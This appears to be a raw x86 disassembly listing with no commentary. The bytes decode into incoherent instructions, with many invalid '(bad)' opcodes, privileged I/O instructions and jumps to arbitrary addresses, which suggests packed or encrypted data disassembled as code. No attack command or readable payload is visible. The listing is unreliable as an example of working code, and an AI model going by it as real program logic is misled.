  41d748:	jmp    0x41d6f7
  41d74a:	pop    es
  41d74b:	jmp    0xd85fecd8
  41d750:	and    ebp,edx
  41d752:	add    eax,0x10557e51
  41d757:	les    ebx,FWORD PTR [ecx-0x4a7f6ffb]
  41d75d:	sub    bh,BYTE PTR [ebp-0x77]
  41d760:	cmp    al,0x88
  41d762:	jmp    0x41d717
  41d764:	and    cl,BYTE PTR [ecx+ebx*8]
  41d767:	leave  
  41d768:	fistp  QWORD PTR [ecx]
  41d76a:	dec    eax
  41d76b:	loope  0x41d799
  41d76d:	pop    esi
  41d76e:	leave  
  41d76f:	mov    al,0xc1
  41d771:	mov    al,ds:0x7beac7de
  41d776:	jbe    0x41d7bf
  41d778:	push   cs
  41d779:	sti    
  41d77a:	pop    edx
  41d77b:	and    dl,ah
  41d77d:	mov    ebx,0xf1befe04
  41d782:	test   BYTE PTR ds:[esi],ah
  41d785:	push   esp
  41d786:	call   0xb720de82
  41d78b:	jl     0x41d7b7
  41d78d:	retf   0xc9e5
  41d790:	cmc    
  41d791:	scas   eax,DWORD PTR es:[edi]
  41d792:	loop   0x41d782
  41d794:	xor    eax,0x5cfd669c
  41d799:	outs   dx,BYTE PTR ds:[esi]
  41d79a:	xchg   edx,eax
  41d79b:	mov    ds:0x8a7dfd8a,al
  41d7a0:	jbe    0x41d780
  41d7a2:	cmp    BYTE PTR [edx-0x20],cl
  41d7a5:	cld    
  41d7a6:	pop    ebp
  41d7a7:	mov    bl,ch
  41d7a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7aa:	(bad)  
  41d7ac:	cmp    esi,DWORD PTR [edi-0x2]
  41d7af:	add    DWORD PTR [ecx+edi*4-0xa],edx
  41d7b3:	leave  
  41d7b4:	pop    ebx
  41d7b5:	std    
  41d7b6:	xchg   DWORD PTR ds:0x71267d7d,esi
  41d7bc:	retf   
  41d7bd:	jmp    0xf934d551
  41d7c2:	in     eax,0x3e
  41d7c4:	sub    DWORD PTR [eax+0x50],eax
  41d7c7:	xor    al,al
  41d7c9:	hlt    
  41d7ca:	test   BYTE PTR [ebx+0x14],bh
  41d7cd:	push   ebx
  41d7ce:	in     al,dx
  41d7cf:	inc    ebp
  41d7d0:	jae    0x41d7a4
  41d7d2:	loop   0x41d845
  41d7d4:	xchg   edi,eax
  41d7d5:	cs adc al,0x83
  41d7d8:	stos   DWORD PTR es:[edi],eax
  41d7d9:	data16 mov bl,0xf9
  41d7dc:	leave  
  41d7dd:	test   al,0xc7
  41d7df:	loope  0x41d797
  41d7e1:	xor    BYTE PTR [esi+0x62],0xf3
  41d7e5:	pop    edx
  41d7e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7e7:	test   al,0x8f
  41d7e9:	adc    al,0x6f
  41d7eb:	lods   eax,DWORD PTR ds:[esi]
  41d7ec:	pop    eax
  41d7ed:	inc    edx
  41d7ee:	lds    edi,FWORD PTR [edx+0x615af168]
  41d7f4:	scas   eax,DWORD PTR es:[edi]
  41d7f5:	inc    edi
  41d7f6:	jecxz  0x41d7f9
  41d7f8:	adc    eax,DWORD PTR [edi+edi*4]
  41d7fb:	or     al,0x14
  41d7fd:	sub    BYTE PTR cs:[ebp+0x44],ah
  41d801:	inc    esi
  41d802:	out    0x5d,al
  41d804:	(bad)  
  41d805:	into   
  41d806:	stos   BYTE PTR es:[edi],al
  41d807:	jbe    0x41d853
  41d809:	inc    ecx
  41d80a:	outs   dx,DWORD PTR ds:[esi]
  41d80b:	imul   esp,DWORD PTR [ebx+0x67],0x5
  41d80f:	clc    
  41d810:	mov    ch,0x29
  41d812:	mov    edi,0x50cc342c
  41d817:	(bad)  
  41d818:	hlt    
  41d819:	add    bh,BYTE PTR [edi]
  41d81b:	sub    dl,BYTE PTR ds:0xbc7fe60e
  41d821:	loopne 0x41d7cc
  41d823:	lock push esp
  41d825:	popf   
  41d826:	ret    
  41d827:	xor    BYTE PTR [ebx],0xd0
  41d82a:	push   ss
  41d82b:	mov    BYTE PTR [ecx],al
  41d82d:	inc    ecx
  41d82e:	add    DWORD PTR [ecx-0x3314d9cb],eax
  41d834:	cli    
  41d835:	pop    ebx
  41d836:	cdq    
  41d837:	sub    ch,BYTE PTR [eax-0x18]
  41d83a:	popf   
  41d83b:	push   esp
  41d83c:	mov    ah,BYTE PTR [edi-0x1e]
  41d83f:	add    DWORD PTR [ebp-0x5d],ebx
  41d842:	mov    bh,0x5e
  41d844:	sbb    eax,0x432bbc30
  41d849:	fimul  WORD PTR [edx-0x5d]
  41d84c:	cmc    
  41d84d:	xor    al,0x88
  41d84f:	outs   dx,DWORD PTR ds:[esi]
  41d850:	push   edx
  41d851:	dec    ebx
  41d852:	mov    dl,cl
  41d854:	shl    DWORD PTR [edi-0x71796c4f],0xea
  41d85b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d85c:	enter  0xd456,0x2b
  41d860:	or     BYTE PTR [ebx-0x133ccf56],cl
  41d866:	fidiv  WORD PTR [ebp+0x11]
  41d869:	push   0xd37ab01a
  41d86e:	and    al,0xad
  41d870:	je     0x41d8e6
  41d872:	add    BYTE PTR [eax-0x3c4398c3],0x39
  41d879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d87a:	jecxz  0x41d833
  41d87c:	add    al,0xae
  41d87e:	gs xchg edi,eax
  41d880:	test   BYTE PTR [edi],cl
  41d882:	or     eax,0x7f604f1c
  41d887:	jne    0x41d850
  41d889:	out    dx,al
  41d88a:	aad    0xbf
  41d88c:	lods   al,BYTE PTR ds:[esi]
  41d88d:	mov    ds:0xb951ee36,al
  41d892:	xor    eax,0xe62d4d5d
  41d897:	jne    0x41d83b
  41d899:	je     0x41d8b1
  41d89b:	dec    eax
  41d89c:	ret    
  41d89d:	ss cld 
  41d89f:	mov    bh,0xc5
  41d8a1:	lea    ebp,cs:[ebx+ebx*8]
  41d8a5:	cmp    DWORD PTR [ebx-0x4f3867df],edx
  41d8ab:	out    dx,al
  41d8ac:	cdq    
  41d8ad:	jne    0x41d8e3
  41d8af:	jmp    0xd13f853e
  41d8b4:	and    al,0x6f
  41d8b6:	(bad)  
  41d8b7:	div    DWORD PTR [ecx-0x18]
  41d8ba:	jb     0x41d910
  41d8bc:	inc    ebp
  41d8bd:	jmp    0x83b7a162
  41d8c2:	push   DWORD PTR [edx+0x25]
  41d8c5:	dec    esi
  41d8c6:	in     al,dx
  41d8c7:	fdiv   st(1),st
  41d8c9:	shl    DWORD PTR [ebx-0xfe47951],cl
  41d8cf:	jp     0x41d910
  41d8d1:	stos   DWORD PTR es:[edi],eax
  41d8d2:	add    al,0x63
  41d8d4:	rcr    ah,0xb0
  41d8d7:	fwait
  41d8d8:	mov    al,0xe8
  41d8da:	setb   BYTE PTR [esi+0x44]
  41d8de:	add    eax,edi
  41d8e0:	xor    ah,BYTE PTR [edx+0x4c9560d7]
  41d8e6:	sub    DWORD PTR [esi],ebp
  41d8e8:	ror    BYTE PTR [esi+ebp*2+0x6f039015],0x95
  41d8f0:	dec    esi
  41d8f1:	enter  0xc9e,0xab
  41d8f5:	ret    
  41d8f6:	call   0x8ae0b6ba
  41d8fb:	and    DWORD PTR [esi-0x60],ecx
  41d8fe:	mov    ds:0xb0d99a82,al
  41d903:	mov    ebp,DWORD PTR [ebx+ebx*4+0x559c84e2]
  41d90a:	dec    esp
  41d90b:	cld    
  41d90c:	mov    esp,0xbe841549
  41d911:	xchg   sp,ax
  41d913:	mov    dh,0x99
  41d915:	ja     0x41d8e0
  41d917:	cwde   
  41d918:	les    esi,FWORD PTR [ecx-0x6a]
  41d91b:	inc    BYTE PTR [esi]
  41d91d:	adc    eax,0x9a3387dc
  41d922:	mov    dh,0x1f
  41d924:	push   ebx
  41d925:	aam    0x4c
  41d927:	retf   
  41d928:	dec    edi
  41d929:	dec    edi
  41d92a:	dec    ebx
  41d92b:	ins    BYTE PTR es:[edi],dx
  41d92c:	jae    0x41d933
  41d92e:	sub    eax,0xa1daf018
  41d933:	push   esi
  41d934:	mov    ds:0x94a44d17,eax
  41d939:	stos   DWORD PTR es:[edi],eax
  41d93a:	inc    edx
  41d93b:	inc    esi
  41d93c:	push   es
  41d93d:	je     0x41d8c7
  41d93f:	inc    edx
  41d940:	je     0x41d98f
  41d942:	cmp    al,0x3c
  41d944:	data16 fisttp QWORD PTR [ebx]
  41d947:	pop    eax
  41d948:	sti    
  41d949:	lds    edx,FWORD PTR [eax+ebp*2-0x2793627c]
  41d950:	cmp    al,0x1c
  41d952:	xor    al,0x20
  41d954:	ins    WORD PTR es:[edi],dx
  41d956:	pop    ebx
  41d957:	sbb    BYTE PTR [ecx+0x60],dl
  41d95a:	inc    ebp
  41d95b:	sub    DWORD PTR [edx],0x7f55bb75
  41d961:	sub    eax,0x81899138
  41d966:	inc    edi
  41d967:	in     eax,dx
  41d968:	pop    edx
  41d969:	xchg   esp,eax
  41d96a:	inc    ebp
  41d96b:	test   DWORD PTR [ebp-0x1f34454e],esi
  41d971:	push   cs
  41d972:	(bad)  
  41d974:	arpl   ax,si
  41d976:	bound  edx,QWORD PTR es:[ebx-0x5c]
  41d97a:	jne    0x41d995
  41d97c:	jns    0x41d93e
  41d97e:	adc    eax,0x9304737b
  41d983:	inc    ebp
  41d984:	xor    esp,DWORD PTR [edi]
  41d986:	sbb    eax,0x9edb20f
  41d98b:	iret   
  41d98c:	and    ah,al
  41d98e:	cmc    
  41d98f:	push   edi
  41d990:	retf   
  41d991:	enter  0xa968,0x2d
  41d995:	int    0xd7
  41d997:	int    0xb6
  41d999:	add    esp,DWORD PTR [edx]
  41d99b:	sub    DWORD PTR [eax+0x65c4a907],ecx
  41d9a1:	push   ss
  41d9a2:	cli    
  41d9a3:	jnp    0x41d9a5
  41d9a5:	sub    eax,0x6d90098c
  41d9aa:	retf   
  41d9ab:	push   0xcc8280a6
  41d9b0:	rsm    
  41d9b2:	xor    al,0x19
  41d9b4:	or     al,BYTE PTR [ebp+0x62]
  41d9b7:	xchg   ebx,eax
  41d9b8:	sub    dl,BYTE PTR [edi]
  41d9ba:	jno    0x41d9f1
  41d9bc:	test   BYTE PTR [eax-0x66138783],cl
  41d9c2:	dec    ebp
  41d9c3:	ja     0x41d99b
  41d9c5:	les    edx,FWORD PTR ds:[edi+0x47]
  41d9c9:	hlt    
  41d9ca:	cmp    eax,0x747602a9
  41d9cf:	adc    cl,0xe2
  41d9d2:	jl     0x41d99d
  41d9d4:	and    DWORD PTR [esi-0x79],esp
  41d9d7:	fs (bad) 
  41d9d9:	xchg   edx,eax
  41d9da:	ins    BYTE PTR es:[edi],dx
  41d9db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9dc:	xchg   DWORD PTR [ecx-0x5e],ebx
  41d9df:	mov    DWORD PTR [ebp+0x14],ebp
  41d9e2:	mov    dl,BYTE PTR [ebx+edx*1+0x22]
  41d9e6:	into   
  41d9e7:	and    eax,0x6ffa20c4
  41d9ec:	lods   eax,DWORD PTR ds:[esi]
  41d9ed:	vmwrite edi,DWORD PTR [ebp-0x5e]
  41d9f1:	outs   dx,DWORD PTR ds:[esi]
  41d9f2:	popa   
  41d9f3:	cmp    al,0xa8
  41d9f5:	ss jmp 0x41d987
  41d9f8:	sbb    cl,cl
  41d9fa:	sti    
  41d9fb:	int3   
  41d9fc:	stos   BYTE PTR es:[edi],al
  41d9fd:	call   0xaff5d1e5
  41da02:	adc    BYTE PTR [ebp+0x566a5396],bh
  41da08:	lds    ebx,FWORD PTR [ebp-0x71]
  41da0b:	mov    ah,0x33
  41da0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da0e:	push   ecx
  41da0f:	leave  
  41da10:	add    DWORD PTR [esi],0xffffffdb
  41da13:	fnstenv [ebp-0x4]
  41da16:	adc    esp,DWORD PTR [ebp+0x4d]
  41da19:	js     0x41da4c
  41da1b:	shr    BYTE PTR ds:0x78872bf1,1
  41da21:	lea    ebx,[edx-0x16c40075]
  41da27:	stos   DWORD PTR es:[edi],eax
  41da28:	rcl    DWORD PTR [ecx+edi*4-0x759074c5],cl
  41da2f:	mov    ecx,0x1e8eddb6
  41da34:	aam    0xd7
  41da36:	push   ds
  41da37:	test   BYTE PTR ds:0x596a97d1,dh
  41da3d:	inc    edi
  41da3e:	mov    DWORD PTR cs:[eax],ebp
  41da41:	inc    ebp
  41da42:	neg    ebx
  41da44:	retf   0x894c
  41da47:	(bad)
  41da4a:	das    
  41da4b:	sub    BYTE PTR [esi],dh
  41da4d:	mov    esi,0x3d30fb6b
  41da52:	imul   esi,eax,0x62d959eb
  41da58:	push   es
  41da59:	sub    DWORD PTR [edi*4-0x8b8b9ee],esp
  41da60:	sub    al,0x88
  41da62:	es mov dh,0x9a
  41da65:	mov    ds:0xc3bbc572,eax
  41da6a:	dec    esp
  41da6b:	cdq    
  41da6c:	iret   
  41da6d:	xchg   ebx,eax
  41da6e:	xchg   edx,eax
  41da6f:	ret    0xf246
  41da72:	jle    0x41da16
  41da74:	inc    ecx
  41da75:	(bad)  
  41da76:	aad    0xd2
  41da78:	jmp    FWORD PTR [ecx-0x5960fae1]
  41da7e:	out    0x45,al
  41da80:	sub    al,0x39
  41da82:	xchg   BYTE PTR [esi+0x7fd34cf1],dl
  41da88:	ror    al,1
  41da8a:	sub    esi,DWORD PTR [eax-0x7c]
  41da8d:	mov    ds:0x623909ac,eax
  41da92:	xchg   edi,eax
  41da93:	jno    0x41daff
  41da95:	and    al,0x53
  41da97:	push   ss
  41da98:	sbb    eax,0x3a9c47da
  41da9d:	sub    al,0x5d
  41da9f:	mov    cl,0x51
  41daa1:	call   0x7c39bb5a
  41daa6:	or     al,BYTE PTR [edx]
  41daa8:	out    0xc2,al
  41daaa:	imul   esi,DWORD PTR [edi+0x76],0xb7048a76
  41dab1:	aad    0x8e
  41dab3:	jne    0x41da53
  41dab5:	sbb    BYTE PTR ds:0xe01c7a17,ch
  41dabb:	call   DWORD PTR [ecx]
  41dabd:	(bad)  
  41dabf:	sbb    DWORD PTR [edi-0x6c],0x3e
  41dac3:	or     al,0xfe
  41dac5:	add    ebp,DWORD PTR [ecx]
  41dac7:	jb     0x41daf7
  41dac9:	psubd  mm3,QWORD PTR [edi+0x4f9c7325]
  41dad0:	dec    ebx
  41dad1:	xchg   edx,eax
  41dad2:	dec    esp
  41dad3:	lods   al,BYTE PTR ds:[esi]
  41dad4:	fwait
  41dad5:	adc    edi,DWORD PTR [edi-0x2944a78f]
  41dadb:	mov    dh,0x17
  41dadd:	scas   eax,DWORD PTR es:[edi]
  41dade:	inc    ebp
  41dadf:	popa   
  41dae0:	aas    
  41dae1:	aad    0xd3
  41dae3:	jl     0x41dac8
  41dae5:	mov    ds:0x1d8e5810,al
  41daea:	sbb    edx,DWORD PTR ds:0x48b0e2ce
  41daf0:	push   ds
  41daf1:	lods   al,BYTE PTR ds:[esi]
  41daf2:	push   ecx
  41daf3:	call   0x342b51d8
  41daf8:	inc    esi
  41daf9:	fimul  WORD PTR [esi-0x1e]
  41dafc:	mov    ebx,0xcaf6d9ce
  41db01:	push   0x3dff40c9
  41db06:	fbstp  TBYTE PTR [edx]
  41db08:	cmc    
  41db09:	or     ebp,DWORD PTR [ecx-0x49]
  41db0c:	cs pop edx
  41db0e:	outs   dx,BYTE PTR ds:[esi]
  41db0f:	pop    ss
  41db10:	outs   dx,DWORD PTR ds:[esi]
  41db11:	(bad)
  41db16:	jne    0x41db5d
  41db18:	add    eax,0x440b8634
  41db1d:	test   al,0x70
  41db1f:	or     al,BYTE PTR [edx+0x73]
  41db22:	cs sar ah,0x1
  41db26:	imul   esp,edx,0xffffffde
  41db29:	mov    ch,0xbd
  41db2b:	jo     0x41db3d
  41db2d:	mov    ds:0xd5210b68,eax
  41db32:	int    0x27
  41db34:	mul    BYTE PTR [edx+0x683ec5ab]
  41db3a:	sbb    ecx,DWORD PTR [esi-0x6b9ba6]
  41db40:	push   esi
  41db41:	and    DWORD PTR [esi],esi
  41db43:	shl    BYTE PTR [eax+0x76],1
  41db46:	in     eax,dx
  41db47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db48:	in     al,0x76
  41db4a:	inc    eax
  41db4b:	push   esp
  41db4c:	daa    
  41db4d:	mov    ecx,DWORD PTR [eax+0x7]
  41db50:	inc    edx
  41db51:	outs   dx,DWORD PTR gs:[esi]
  41db53:	je     0x41dae3
  41db55:	and    BYTE PTR [eax+0x5a612ea3],al
  41db5b:	pop    ebp
  41db5c:	jno    0x41db9d
  41db5e:	jge    0x41db69
  41db60:	adc    ah,BYTE PTR [edi+ecx*1+0x39]
  41db64:	test   al,0xf9
  41db66:	sub    ebx,DWORD PTR [edi+0x114313f6]
  41db6c:	cwde   
  41db6d:	imul   edx,DWORD PTR [ecx+0x1b],0xae97e84f
  41db74:	adc    ebx,DWORD PTR [edi]
  41db76:	cmp    esp,DWORD PTR [ebp+0x5a]
  41db79:	sar    DWORD PTR [edx+0x75],cl
  41db7c:	mov    al,ds:0x839df439
  41db81:	jns    0x41db8d
  41db83:	out    dx,eax
  41db84:	fiadd  WORD PTR [esi+0x3f]
  41db87:	sub    BYTE PTR [eax],ah
  41db89:	fcom   QWORD PTR [ebp+0x2feb6744]
  41db8f:	repnz arpl WORD PTR [esi+0x73],bx
  41db93:	addr16 push ss
  41db95:	cwde   
  41db96:	call   0xfef6:0x9ffe7552
  41db9d:	ins    BYTE PTR es:[edi],dx
  41db9e:	in     al,dx
  41db9f:	js     0x41db7d
  41dba1:	pushf  
  41dba2:	int    0xb6
  41dba4:	mov    dh,0xd7
  41dba6:	sub    bl,BYTE PTR [edi]
  41dba8:	addr16 mov al,dh
  41dbab:	dec    ecx
  41dbac:	das    
  41dbad:	ds lahf 
  41dbaf:	and    BYTE PTR [eax-0x51],al
  41dbb2:	xchg   ebx,eax
  41dbb3:	mov    ss,WORD PTR [edi+0x4cb6d654]
  41dbb9:	aas    
  41dbba:	add    bh,ah
  41dbbc:	mov    WORD PTR [edx-0x7a],ss
  41dbbf:	shl    dh,cl
  41dbc1:	jle    0x41dbfe
  41dbc3:	jb     0x41dc44
  41dbc5:	mov    esi,DWORD PTR [edx]
  41dbc7:	jmp    0x41dc0d
  41dbc9:	push   edi
  41dbca:	loope  0x41dbc6
  41dbcc:	mov    esp,0xaabdd2c
  41dbd1:	fst    DWORD PTR [ebp+0x6158ce35]
  41dbd7:	call   0xfa8c:0x2703bc54
  41dbde:	ret    
  41dbdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbe0:	shr    BYTE PTR ds:0x87df5e95,1
  41dbe6:	aam    0x7
  41dbe8:	xchg   edx,eax
  41dbe9:	pop    esp
  41dbea:	lahf   
  41dbeb:	push   es
  41dbec:	mov    ebp,0x8512595a
  41dbf1:	inc    edx
  41dbf2:	mov    bl,0xc2
  41dbf4:	outs   dx,BYTE PTR ds:[esi]
  41dbf5:	jb     0x41dbf7
  41dbf7:	aad    0xf7
  41dbf9:	or     DWORD PTR [ecx-0x3181f749],esp
  41dbff:	mov    DWORD PTR ds:0x12cc21f2,ebp
  41dc05:	cs jno 0x41dba2
  41dc08:	out    dx,al
  41dc09:	in     eax,dx
  41dc0a:	add    edi,DWORD PTR [edi+eiz*2]
  41dc0d:	sub    edi,edi
  41dc0f:	xor    ebp,DWORD PTR [ebx-0x70]
  41dc12:	mov    eax,0xa9372b4d
  41dc17:	and    dl,bh
  41dc19:	dec    ebp
  41dc1a:	iret   
  41dc1b:	inc    edi
  41dc1c:	loop   0x41dc01
  41dc1e:	xor    eax,0x55ff822e
  41dc23:	mov    ebp,DWORD PTR [ebx]
  41dc25:	mov    ebp,0x4e69e368
  41dc2a:	mul    BYTE PTR [ebx]
  41dc2c:	ror    ch,1
  41dc2e:	stos   BYTE PTR es:[edi],al
  41dc2f:	pop    edi
  41dc30:	aam    0x42
  41dc32:	xor    al,0x20
  41dc34:	xor    eax,0xb0044cc4
  41dc39:	mov    bl,0x5b
  41dc3b:	and    DWORD PTR [eax+0x7a],0x7e
  41dc3f:	or     BYTE PTR ds:0x5793d796,ch
  41dc45:	inc    esp
  41dc46:	pop    ds
  41dc47:	stc    
  41dc48:	jmp    0x49efb4fa
  41dc4d:	jns    0x41dbd6
  41dc4f:	inc    ebp
  41dc50:	fmul   st(6),st
  41dc52:	lods   al,BYTE PTR ds:[esi]
  41dc53:	cmp    eax,0x93e9b491
  41dc58:	mov    DWORD PTR [edi+0x27],edi
  41dc5b:	xchg   ebx,eax
  41dc5c:	iret   
  41dc5d:	cmc    
  41dc5e:	xor    eax,0xf573d99d
  41dc63:	cmp    eax,0x6d5b74aa
  41dc68:	test   eax,0xe9964b48
  41dc6d:	in     eax,dx
  41dc6e:	and    esi,DWORD PTR [eax-0x4b]
  41dc71:	addr16 jb 0x41dca8
  41dc74:	or     eax,0x94b8086a
  41dc79:	dec    ebx
  41dc7b:	imul   ecx,ecx,0x1e
  41dc7e:	jle    0x41dcd9
  41dc80:	xlat   BYTE PTR ds:[ebx]
  41dc81:	mov    bh,BYTE PTR [edx+0x28]
  41dc84:	and    BYTE PTR [eax+0x27],0x74
  41dc88:	sahf   
  41dc89:	sub    al,0x5e
  41dc8b:	add    DWORD PTR [ecx+0x26],0x4468d3f8
  41dc92:	ret    
  41dc93:	rcl    BYTE PTR [eax-0x4f],1
  41dc96:	jae    0x41dca8
  41dc98:	mov    al,0x9d
  41dc9a:	push   esi
  41dc9b:	mov    edx,0xd8bb0c1e
  41dca0:	enter  0x4cd9,0x68
  41dca4:	(bad)  
  41dca5:	cmp    ebx,edx
  41dca7:	addr16 popf 
  41dca9:	push   edi
  41dcaa:	stos   DWORD PTR es:[edi],eax
  41dcab:	add    BYTE PTR [ecx+esi*4],al
  41dcae:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41dcb0:	ret    
  41dcb1:	fadd   DWORD PTR [eax+0x5d]
  41dcb4:	pop    esi
  41dcb5:	mov    bh,ah
  41dcb7:	pop    ss
  41dcb8:	xor    BYTE PTR [ebx-0x6a396bfd],0x20
  41dcbf:	sbb    DWORD PTR [eax+0x64],edi
  41dcc2:	out    0xc5,eax
  41dcc4:	mov    al,ds:0xa3925bfc
  41dcc9:	adc    BYTE PTR [ecx-0x72608308],bl
  41dccf:	ret    0xbe8f
  41dcd2:	pusha  
  41dcd3:	dec    esi
  41dcd4:	push   es
  41dcd5:	cmp    al,0xa0
  41dcd7:	mov    ebx,0x94c5a73a
  41dcdc:	jns    0x41dc9b
  41dcde:	in     al,0xad
  41dce0:	inc    esi
  41dce1:	xchg   BYTE PTR [ecx+0x45],cl
  41dce4:	inc    ebp
  41dce5:	loop   0x41dcc0
  41dce7:	in     eax,0x40
  41dce9:	pop    eax
  41dcea:	jmp    0x41dcd3
  41dcec:	clc    
  41dced:	bound  ebp,QWORD PTR [ecx]
  41dcef:	cmp    BYTE PTR [esi],dl
  41dcf1:	inc    edx
  41dcf2:	push   ebp
  41dcf3:	jns    0x41dd13
  41dcf5:	jecxz  0x41dc9e
  41dcf7:	test   eax,0xad0442b1
  41dcfc:	cmp    DWORD PTR [eax+0x64aac9b5],edx
  41dd02:	call   0x1789:0xf38212aa
  41dd09:	imul   esi,esp,0x3eb94d89
  41dd0f:	xor    al,0x88
  41dd11:	sub    BYTE PTR [ecx+0x69],cl
  41dd14:	fiadd  WORD PTR [ebx-0x8d757a9]
  41dd1a:	or     dh,BYTE PTR fs:[ecx]
  41dd1d:	pop    esi
  41dd1e:	icebp  
  41dd1f:	loope  0x41dcb1
  41dd21:	pop    ds
  41dd22:	and    dh,BYTE PTR [esi-0x6a]
  41dd25:	adc    dh,cl
  41dd27:	and    eax,0x3a424953
  41dd2c:	fisttp QWORD PTR [eax+0x36a8efef]
  41dd32:	push   ss
  41dd33:	adc    BYTE PTR [eax],bh
  41dd35:	ins    BYTE PTR es:[edi],dx
  41dd36:	test   DWORD PTR [edx],esi
  41dd38:	aam    0x17
  41dd3a:	push   ebx
  41dd3b:	(bad)  
  41dd3c:	hlt    
  41dd3d:	aas    
  41dd3e:	mov    ah,0x7f
  41dd40:	loop   0x41dd4f
  41dd42:	in     eax,0xc1
  41dd44:	sbb    BYTE PTR [ebp+0x682fec4c],dl
  41dd4a:	pushf  
  41dd4b:	lock and ebx,0x49
  41dd4f:	xor    ecx,0x5a
  41dd52:	iret   
  41dd53:	mov    al,ds:0x979f7b20
  41dd58:	outs   dx,DWORD PTR ds:[esi]
  41dd59:	cmp    edx,edi
  41dd5b:	inc    edx
  41dd5c:	and    al,0x46
  41dd5e:	adc    DWORD PTR [ebp+0x6],esi
  41dd61:	lods   al,BYTE PTR ds:[esi]
  41dd62:	test   esi,0xd0049a2f
  41dd68:	push   edx
  41dd69:	arpl   dx,dx
  41dd6b:	mov    edx,0xbdbc1e2f
  41dd70:	lods   al,BYTE PTR ds:[esi]
  41dd71:	test   al,0x9e
  41dd73:	lods   eax,DWORD PTR ds:[esi]
  41dd74:	jo     0x41ddc7
  41dd76:	sbb    al,0xbc
  41dd78:	xor    bh,cl
  41dd7a:	and    eax,0x593a8235
  41dd7f:	cs add al,0xac
  41dd82:	inc    ecx
  41dd83:	sbb    BYTE PTR ds:0xab730e16,cl
  41dd89:	popa   
  41dd8a:	cli    
  41dd8b:	add    edx,DWORD PTR [esp+esi*4-0x43]
  41dd8f:	mov    edx,0x18962bc5
  41dd94:	jl     0x41ddb0
  41dd96:	sbb    eax,0xbf9926eb
  41dd9b:	sbb    dl,BYTE PTR [esi-0x26]
  41dd9e:	mov    esi,0xa9b1733f
  41dda3:	mov    esi,0x74709ce2
  41dda8:	inc    ebp
  41dda9:	ds jmp 0x285d:0x6ba4685
  41ddb1:	js     0x41dd87
  41ddb3:	stos   BYTE PTR es:[edi],al
  41ddb4:	sub    eax,0x41978927
  41ddb9:	test   DWORD PTR [ecx-0x3ed4452],ebx
  41ddbf:	test   DWORD PTR [edx-0x716da250],ebx
  41ddc5:	pop    ds
  41ddc6:	fmul   DWORD PTR [ecx]
  41ddc8:	xchg   ebp,eax
  41ddc9:	aam    0xae
  41ddcb:	mov    esp,0x52a26e64
  41ddd0:	jno    0x41ddfe
  41ddd2:	scas   eax,DWORD PTR es:[edi]
  41ddd3:	loope  0x41dd85
  41ddd5:	jnp    0x41dd73
  41ddd7:	jae    0x41de03
  41ddd9:	adc    eax,0xa75aebd9
  41ddde:	jmp    0x41dd92
  41dde0:	fmulp  st(0),st
  41dde2:	adc    bh,cl
  41dde4:	and    eax,0xcbde37c4
  41dde9:	dec    ebx
  41ddea:	mov    dl,0x80
  41ddec:	fmul   DWORD PTR [esi+0x749933]
  41ddf2:	jne    0x41ddb1
  41ddf4:	pushf  
  41ddf5:	push   ebx
  41ddf6:	dec    ebp
  41ddf7:	or     BYTE PTR [edx],dl
  41ddf9:	shl    DWORD PTR [ecx],0xcb
  41ddfc:	sbb    DWORD PTR [esi+0x2cd8333c],esp
  41de02:	xchg   ebx,eax
  41de03:	jbe    0x41de4b
  41de05:	out    dx,eax
  41de06:	adc    ebx,DWORD PTR [eax]
  41de08:	mov    esi,0x6c318b08
  41de0d:	repz jns 0x41dddd
  41de10:	xor    DWORD PTR [edi+0x48792340],0xffffffd9
  41de17:	and    DWORD PTR [edi],ebx
  41de19:	ins    BYTE PTR es:[edi],dx
  41de1a:	(bad)  
  41de1b:	data16 fcmove st,st(0)
  41de1e:	retf   
  41de1f:	inc    ecx
  41de20:	pop    ss
  41de21:	cli    
  41de22:	or     edx,DWORD PTR [ecx]
  41de24:	sub    esi,ecx
  41de26:	call   0x3308cd6
  41de2b:	push   esp
  41de2c:	pusha  
  41de2d:	dec    ebp
  41de2e:	push   eax
  41de2f:	dec    ecx
  41de30:	test   eax,0x89b531a9
  41de35:	pop    ecx
  41de36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de37:	stos   BYTE PTR es:[edi],al
  41de38:	push   0x469fbd08
  41de3d:	and    al,0x18
  41de3f:	(bad)  
  41de40:	adc    DWORD PTR [edx+0x5dcd1466],0x28
  41de47:	ins    BYTE PTR es:[edi],dx
  41de48:	lods   eax,DWORD PTR ds:[esi]
  41de49:	lock dec eax
  41de4b:	inc    ebx
  41de4c:	lock test BYTE PTR [edx],dh
  41de4f:	pop    ebx
  41de50:	pop    eax
  41de51:	pop    esi
  41de52:	mov    eax,0x891d21f3
  41de57:	les    esp,FWORD PTR [esp+ebp*2+0x2b]
  41de5b:	arpl   WORD PTR [eax+ebp*2],si
  41de5e:	add    al,0xca
  41de60:	push   ebp
  41de61:	out    dx,al
  41de62:	jo     0x41ddf2
  41de64:	push   ecx
  41de65:	mov    bl,0x68
  41de67:	lock loop 0x41dea7
  41de6a:	retf   
  41de6b:	dec    edi
  41de6c:	loop   0x41deba
  41de6e:	jo     0x41de60
  41de70:	fisub  DWORD PTR [esi]
  41de72:	stos   BYTE PTR es:[edi],al
  41de73:	outs   dx,BYTE PTR ds:[esi]
  41de74:	mov    ecx,0x651d2413
  41de79:	popf   
  41de7a:	sbb    ch,BYTE PTR [ecx+ecx*8+0x35]
  41de7e:	repz les edx,FWORD PTR [ebp-0x3c]
  41de82:	xchg   edi,eax
  41de83:	mov    esi,0x1c826f44
  41de88:	outs   dx,BYTE PTR ds:[esi]
  41de89:	jmp    0x28dbe34b
  41de8e:	or     cl,ah
  41de90:	inc    eax
  41de91:	add    eax,0xb86fbdb4
  41de96:	sub    dh,dh
  41de98:	int3   
  41de99:	jno    0x41df13
  41de9b:	fdiv   DWORD PTR [eiz*4-0x1269bcec]
  41dea2:	or     BYTE PTR [esi-0x41],0x12
  41dea6:	(bad)  
  41dea7:	stos   BYTE PTR es:[edi],al
